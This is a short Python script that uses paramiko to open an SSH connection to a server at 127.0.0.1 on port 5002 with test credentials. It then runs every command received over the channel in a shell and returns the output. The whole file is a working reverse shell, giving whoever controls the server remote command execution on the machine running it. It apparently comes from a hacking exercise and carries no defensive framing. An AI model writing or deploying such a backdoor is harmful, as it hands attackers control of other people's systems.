#! /usr/bin/env python3

import paramiko
import threading
import subprocess
import os
import sys
import pty

HOST = '127.0.0.1'
USERNAME = 'test'
PASSWORD = 'test'
PORT = 5002

with paramiko.SSHClient() as c:
#c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, compress=True)
    chan = c.get_transport().open_session()
    chan.send('Connexion established.')
    while True:
        chan.send('remote > ')
        command = chan.recv(1024)
        try:
            CMD = subprocess.check_output(command, shell=True)
            chan.send(CMD)
        except :
            chan.send('error')
        print(chan.recv(1024))
